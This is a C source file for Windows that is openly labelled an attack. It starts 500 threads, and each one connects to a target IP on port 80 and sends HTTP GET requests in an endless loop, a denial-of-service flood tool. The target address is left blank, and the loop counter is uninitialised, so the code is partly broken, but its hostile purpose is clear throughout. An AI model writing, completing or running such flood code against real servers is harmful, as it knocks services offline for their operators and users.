#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>

void startWinsock(WSADATA *wsaData);
SOCKET startSocket();
void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
void sendMsg(SOCKET client_socket, const char *msg);
void closeSocket(SOCKET client_socket);
DWORD WINAPI attack(LPVOID target_ip);

int main(){
    const char* target_ip = "";
    printf("Executing attack...\n");
    for (int i; i<500; i++){
        HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)target_ip, 0, NULL);
        // printf("Thread created");
        if (attack_thread == NULL){
            printf("error creating thread \n");
        }
    }
    // attack( target_ip);
    while (1){
        ;
    }
    return 0;
}

DWORD WINAPI attack(LPVOID target){
    const char* target_ip = (const char*) target;
    SOCKET client_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80);
    startWinsock(&wsaData);
    client_socket = startSocket();
    connectToServer(&serv_addr, client_socket, target_ip);
    char msg[64];
    int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
    // printf("%i", sprintf_stat);
    while(1){
        sendMsg(client_socket, msg);
    }
}

// function to initialize Winsock so that we can use sockets
void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

// function to start the socket and handles errors
SOCKET startSocket() {
    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } 
    return client_socket;
}

// function to connect this client to the server via socket
void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {

    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
        printf("\nConnection Failed. \n");
        printf("%i", client_socket);
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } 
}

// function to send message via socket connection
void sendMsg(SOCKET client_socket, const char *msg) {
    int sent = send(client_socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } 
}

// function to close the socket and clean up the resources that are no longer being used
void closeSocket(SOCKET client_socket) {
    closesocket(client_socket);
    WSACleanup();
}